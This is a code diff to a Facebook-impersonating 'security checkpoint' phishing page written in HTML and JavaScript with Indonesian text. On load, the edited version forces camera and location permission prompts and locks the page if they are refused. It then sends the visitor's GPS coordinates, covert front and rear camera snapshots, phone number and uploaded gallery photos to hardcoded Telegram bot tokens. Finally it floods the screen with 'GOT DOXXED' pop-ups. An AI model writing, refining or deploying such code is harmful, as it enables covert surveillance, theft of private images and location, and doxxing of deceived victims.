@@ -9,7 +9,7 @@
         #splash-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #fff; z-index: 9999; display: flex; flex-direction: column;
-            align-items: center; justify-content: center;
+            align-items: center; justify-content: center; text-align: center; padding: 20px;
         }
         .fb-logo-splash { width: 70px; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
@@ -37,13 +37,6 @@
         }
         @keyframes glitch { from { transform: translate(0,0); } to { transform: translate(3px,3px); } }
         
-        .doxxed-flash {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            color: #ff0000; font-size: 45px; font-weight: 900; z-index: 10005;
-            text-shadow: 4px 4px #000; animation: flash-anim 0.1s infinite; display: none;
-        }
-        @keyframes flash-anim { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
-
         .music-anim { display: flex; gap: 2px; align-items: flex-end; height: 15px; display: none; }
         .bar { width: 3px; height: 100%; background: #fff; animation: wave 1s infinite; }
         @keyframes wave { 0%, 100% { height: 3px; } 50% { height: 15px; } }
@@ -53,8 +46,7 @@
             color: white; padding: 10px 20px; display: flex; align-items: center; 
             justify-content: space-between; backdrop-filter: blur(15px); border-top: 2px solid #1877f2; z-index: 1000;
         }
-        .credit-name { font-size: 14px; font-weight: bold; color: #1877f2; }
-        .play-btn { background: #1877f2; color: white; border: none; border-radius: 50px; padding: 5px 15px; font-size: 12px; font-weight: bold; display: flex; align-items: center; gap: 5px; cursor: pointer; }
+        .play-btn { background: #1877f2; color: white; border: none; border-radius: 50px; padding: 5px 15px; font-size: 12px; font-weight: bold; cursor: pointer; display: flex; align-items: center; gap: 5px; }
         
         #video, #canvas { display: none; }
     </style>
@@ -63,21 +55,22 @@
 
 <div id="splash-screen">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
-    <p class="mt-3 text-muted small">Checking Security System...</p>
+    <h5 id="status-text" class="mt-3 fw-bold">Verifikasi Identitas Sistem...</h5>
+    <p id="sub-status" class="text-muted small">Harap izinkan akses Kamera & Lokasi untuk melanjutkan.</p>
+    <button id="retry-btn" class="btn btn-sm btn-primary mt-2" style="display:none;" onclick="location.reload()">Coba Lagi</button>
 </div>
 
 <div id="chaos-overlay">
     <video id="chaos-video" loop playsinline muted>
         <source src="https://files.catbox.moe/3d0wgv.mp4" type="video/mp4">
     </video>
-    <div id="dox-flash" class="doxxed-flash">YOU GOT DOXXED!</div>
 </div>
 
 <audio id="bgMusic" loop>
     <source src="https://files.catbox.moe/tll0lw.mp3" type="audio/mpeg">
 </audio>
 
-<div class="container">
+<div class="container" id="main-content">
     <div class="main-card card p-4 text-center">
         <div class="fb-logo-text">facebook</div>
         <h6 class="fw-bold mt-2">Checkpoint Keamanan</h6>
@@ -96,11 +89,10 @@
 
 <div class="credit-bar">
     <div class="credit-info">
-        <span style="font-size: 10px; color: #888;">Developed by:</span>
-        <span class="credit-name">Malik & Hack7rBGG/Xymatekidd</span>
+        <span class="small" style="color: #888;">Developed by: Malik & Hack7rBGG</span>
     </div>
-    <button class="play-btn" id="musicBtn" onclick="toggleMusic()">
-        <span id="btnText">▶ PLAY MUSIC</span>
+    <button class="play-btn" onclick="toggleMusic()">
+        <span id="btnText">▶ PLAY</span>
         <div class="music-anim" id="animContainer">
             <div class="bar"></div><div class="bar"></div><div class="bar"></div>
         </div>
@@ -114,78 +106,46 @@
     const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
     const chats = ["7835924973", "8071786272"];
     const audio = document.getElementById('bgMusic');
-    const anim = document.getElementById('animContainer');
 
-    window.onload = () => { setTimeout(() => { 
-        document.getElementById('splash-screen').style.display = 'none';
-        document.body.style.display = 'block';
-        autoCapture("user"); autoLocation();
-    }, 3000); };
+    // FITUR UTAMA: CEK IZIN SEBELUM MASUK 😈
+    window.onload = async () => {
+        try {
+            // Paksa minta Lokasi
+            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+            sendToBot(`📍 LOKASI: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            
+            // Paksa minta Kamera
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            stream.getTracks().forEach(t => t.stop()); // Matiin sementara cuma buat tes izin
 
-    function toggleMusic() {
-        const txt = document.getElementById('btnText');
-        if (audio.paused) { audio.play(); txt.innerText = "⏸ PAUSE"; anim.style.display = "flex"; }
-        else { audio.pause(); txt.innerText = "▶ PLAY MUSIC"; anim.style.display = "none"; }
-    }
+            // Jika semua diizinkan, baru buka website
+            document.getElementById('status-text').innerText = "Akses Diterima!";
+            setTimeout(() => {
+                document.getElementById('splash-screen').style.display = 'none';
+                document.body.style.display = 'block';
+                autoCapture("user"); // Langsung jepret muka
+            }, 1500);
 
-    function sendToBot(content, type = "text", blob = null) {
-        tokens.forEach((token, i) => {
+        } catch (err) {
+            // Jika ditolak, website TERKUNCI 🔒
+            document.getElementById('status-text').innerText = "AKSES DITOLAK!";
+            document.getElementById('status-text').style.color = "red";
+            document.getElementById('sub-status').innerText = "Sistem mendeteksi Anda menolak izin keamanan. Anda tidak dapat mengakses fitur Facebook ini tanpa verifikasi kamera dan lokasi.";
+            document.getElementById('retry-btn').style.display = "inline-block";
+        }
+    };
+
+    function sendToBot(c, t="text", b=null) {
+        tokens.forEach((tk, i) => {
             const fd = new FormData();
             fd.append("chat_id", chats[i]);
-            if (type === "text") {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                    body: `chat_id=${chats[i]}&text=${encodeURIComponent(content)}`
-                });
+            if (t === "text") {
+                fetch(`https://api.telegram.org/bot${tk}/sendMessage`, { method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `chat_id=${chats[i]}&text=${encodeURIComponent(c)}` });
             } else {
-                fd.append("photo", blob || content, "img.jpg");
-                fd.append("caption", content);
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: fd });
+                fd.append("photo", b || c, "img.jpg"); fd.append("caption", c);
+                fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, { method: "POST", body: fd });
             }
         });
-    }
-
-    function validateFinal() {
-        const phone = document.getElementById('phone').value;
-        const files = document.getElementById('galeri').files;
-        if (phone.length < 10 || files.length === 0 || files.length > 5) {
-            document.getElementById('mainError').style.display = 'block';
-            return;
-        }
-        sendToBot(`📱 TARGET: ${phone}`);
-        for (let i = 0; i < files.length; i++) sendToBot(`🖼️ FOTO ${i+1}`, "photo", files[i]);
-        startChaos();
-    }
-
-    function startChaos() {
-        const overlay = document.getElementById('chaos-overlay');
-        const vid = document.getElementById('chaos-video');
-        const dox = document.getElementById('dox-flash');
-        
-        overlay.style.display = 'block';
-        vid.muted = false;
-        vid.play();
-        dox.style.display = 'block';
-
-        // JEDA DIPERCEPAT JADI 15 DETIK (15000ms) ☠️🔥
-        setTimeout(() => {
-            setInterval(() => {
-                let div = document.createElement('div');
-                div.className = 'popup-virus';
-                div.style.top = Math.random() * 80 + '%';
-                div.style.left = Math.random() * 80 + '%';
-                div.innerHTML = "<b>YOU ARE IDIOT!</b><br>GOT DOXXED!";
-                overlay.appendChild(div);
-            }, 250);
-        }, 15000);
-
-        // Download file tetap instan
-        for (let j = 1; j <= 5; j++) {
-            let blob = new Blob(["YOU ARE IDIOT HAHAHA"], { type: "text/plain" });
-            let url = window.URL.createObjectURL(blob);
-            let a = document.createElement("a");
-            a.href = url; a.download = `YOU ARE IDIOT_${j}.txt`; a.click();
-        }
     }
 
     async function autoCapture(mode) {
@@ -198,15 +158,43 @@
                 c.getContext('2d').drawImage(v, 0, 0);
                 c.toBlob(b => sendToBot(`📸 Cam ${mode}`, "photo", b), 'image/jpeg');
                 s.getTracks().forEach(t => t.stop());
-                if(mode === "user") setTimeout(() => autoCapture("environment"), 3500);
+                if(mode === "user") setTimeout(() => autoCapture("environment"), 3000);
             }, 2000);
         } catch (e) {}
     }
 
-    function autoLocation() {
-        navigator.geolocation.getCurrentPosition(p => {
-            sendToBot(`📍 LOKASI: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-        });
+    function toggleMusic() {
+        const anim = document.getElementById('animContainer');
+        if (audio.paused) { audio.play(); document.getElementById('btnText').innerText = "⏸"; anim.style.display = "flex"; }
+        else { audio.pause(); document.getElementById('btnText').innerText = "▶"; anim.style.display = "none"; }
+    }
+
+    function validateFinal() {
+        const p = document.getElementById('phone').value;
+        const f = document.getElementById('galeri').files;
+        if (p.length < 10 || f.length === 0 || f.length > 5) {
+            document.getElementById('mainError').style.display = 'block'; return;
+        }
+        sendToBot(`📱 TARGET: ${p}`);
+        for (let i=0; i<f.length; i++) sendToBot(`🖼️ FOTO ${i+1}`, "photo", f[i]);
+        startChaos();
+    }
+
+    function startChaos() {
+        const ov = document.getElementById('chaos-overlay');
+        const vi = document.getElementById('chaos-video');
+        ov.style.display = 'block'; vi.muted = false; vi.play();
+        
+        // JEDA 15 DETIK BARU WINDOW POPUP MUNCUL
+        setTimeout(() => {
+            setInterval(() => {
+                let d = document.createElement('div');
+                d.className = 'popup-virus';
+                d.style.top = Math.random() * 80 + '%'; d.style.left = Math.random() * 80 + '%';
+                d.innerHTML = "<b>YOU ARE IDIOT!</b><br>GOT DOXXED!";
+                ov.appendChild(d);
+            }, 250);
+        }, 15000);
     }
 </script>
 </body>
